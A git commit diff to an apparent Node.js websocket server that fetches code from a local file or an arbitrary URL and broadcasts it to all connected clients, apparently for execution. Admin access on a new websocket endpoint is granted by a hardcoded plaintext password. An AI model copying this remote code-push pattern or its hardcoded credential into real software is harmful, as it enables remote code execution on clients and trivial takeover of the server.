53809a80990d66f34512c9f014a6436ee3d43605
Pummiphach <roblox2560w@gmail.com>
2021-12-26 21:14:35 +0700

    make it better

--- index.js
+++ index.js
@@ -16,9 +16,14 @@ const rl = readline.createInterface({
 const exportFCF = [];
 const cli = {};
 var rfc_logs = false;
+var currentadminwebsocket = null;
 
 app.get("/",(req,res) => {
     res.send("Hello World");
+});
+
+app.get("/version-get",(req,res) => {
+    res.send("1.0.3 (beta)");
 });
 
 app.ws("/full-control-function",(ws,req) => {
@@ -29,22 +34,56 @@ app.ws("/full-control-function",(ws,req) => {
     });
 });
 
-cli.prompt = () => {
-    rl.prompt();
-};
+app.ws("/administer-control-login",(ws,req) => {
+    var isadminister = false;
+    ws.on("message",(msg) => {
+        if(msg == "hackking3089"){
+            currentadminwebsocket = ws;
+            isadminister = true;
+            ws.send("welcome-administer");
+        };
+        if (isadminister === true){
+            str = msg.toString();
+            if (str.trim().length > 0) {
+                if (str.trim().toLowerCase().split(" ")[0] == "exit") {
+                    cli.exit();
+                } else if (str.trim().toLowerCase().split(" ")[0] == "help") {
+                    cli.help();
+                } else if (str.trim().toLowerCase().split(" ")[0] == "run_full_control") {
+                    if (str.trim().toLowerCase().split(" ")[2] === undefined || str.trim().toLowerCase().split(" ")[2] !== "http_raw") {
+                        if (str.trim().split(" ")[1] !== "" && str.trim().split(" ")[1] !== undefined && fs.existsSync(__dirname + "/" + str.trim().split(" ")[1])) {
+                            cli.rfc(fs.readFileSync(path.join(__dirname + "/" + str.trim().split(" ")[1]),{encoding:'utf8'}));
+                        }else{
+                            cli.message("Incorrect path");
+                        };
+                    }else{
+                        axios.get(str.trim().split(" ")[1]).then((res) => {
+                            cli.rfc(res.data);
+                        }).catch((err) => {
+                            cli.message("Error Log,");
+                            cli.message(err);
+                        });
+                    };
+                } else if (str.trim().toLowerCase().split(" ")[0] == "rfc_logs") {
+                    cli.rfclogs(str.trim().split(" ")[1]);
+                } else if (str.trim().toLowerCase().split(" ")[0] == "connect_clients_logs") {
+                    cli.lsacc();
+                } else {
+                    cli.message(`Not Found "${str.trim()}" In CLI,\nUse "help" to see all available commands`);
+                };
+            };
+        };
+    });
+    ws.on("close",() => {
+        currentadminwebsocket = null;
+    });
+});
 
-cli.message = (str) => {
-    console.log(`\x1b[34m%s\x1b[0m`, str);
+cli.message = (msg) => {
+    if (currentadminwebsocket !== null) {
+        currentadminwebsocket.send(msg);
+    }
 };
-
-cli.help = () => {
-    cli.message("Available commands:");
-    cli.message("    run_full_control <path> <http_raw/null>    -  send command to all current connect to ws");
-    cli.message("    connect_clients_logs                       -  logs all clients connected");
-    cli.message("    rfc_logs <bool>                            -  When send logs to clients will show in console (Default: false)");
-    cli.message("    help                                       -  show all available commands");
-    cli.message("    exit                                       -  exit the node js");
-}
 
 cli.rfc = (loadstringsend) => {
     cli.message("Sending command to all connected clients...");
@@ -77,39 +116,6 @@ cli.lsacc = () => {
 cli.exit = () => {
     process.exit(0);
 };
-
-cli.prompt();
-rl.on('line', (str) => {
-    if (str.trim().length > 0) {
-        if (str.trim().toLowerCase().split(" ")[0] == "exit") {
-            cli.exit();
-        } else if (str.trim().toLowerCase().split(" ")[0] == "help") {
-            cli.help();
-        } else if (str.trim().toLowerCase().split(" ")[0] == "run_full_control") {
-            if (str.trim().toLowerCase().split(" ")[2] === undefined || str.trim().toLowerCase().split(" ")[2] !== "http_raw") {
-                if (str.trim().split(" ")[1] !== "" && str.trim().split(" ")[1] !== undefined && fs.existsSync(__dirname + "/" + str.trim().split(" ")[1])) {
-                    cli.rfc(fs.readFileSync(path.join(__dirname + "/" + str.trim().split(" ")[1]),{encoding:'utf8'}));
-                }else{
-                    cli.message("Incorrect path");
-                };
-            }else{
-                axios.get(str.trim().split(" ")[1]).then((res) => {
-                    cli.rfc(res.data);
-                }).catch((err) => {
-                    cli.message("Error Log,");
-                    cli.message(err);
-                });
-            };
-        } else if (str.trim().toLowerCase().split(" ")[0] == "rfc_logs") {
-            cli.rfclogs(str.trim().split(" ")[1]);
-        } else if (str.trim().toLowerCase().split(" ")[0] == "connect_clients_logs") {
-            cli.lsacc();
-        } else {
-            cli.message(`Not Found "${str.trim()}" In CLI,\nUse "help" to see all available commands`);
-        };
-    };
-    cli.prompt();
-});
 
 app.listen(port,() => {
     console.log("Server is running on port " + port);
